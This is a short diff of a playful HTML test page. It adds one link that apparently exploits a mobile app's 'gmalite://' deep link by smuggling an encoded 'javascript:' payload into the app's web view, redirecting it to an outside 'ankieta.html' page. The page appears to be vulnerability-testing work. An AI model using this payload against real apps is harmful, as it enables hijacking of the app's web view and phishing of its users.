@@ -13,6 +13,8 @@
   <body>
     <h1>uwu</h1>
     <h2><input type="checkbox" class="catboy" />i am a catboy</h2>
+    <a href="gmalite://gmalite-smartweb?weburl=javascript%3A%2F%2Fmcdonalds.pl%2F%250Awindow.location.href%3D%22https%253A%252F%252Fostry.ct8.pl%252Fqk9dc128cccd%252Fankieta.html%253Fa%253D1653899195491%22%2F%2F%0A">przenies</a>
+    <br>
     <a href="?ddd">ddd</a>
     <a href="?ddd2">ddd2</a>
     <a href="?corn">corn</a>
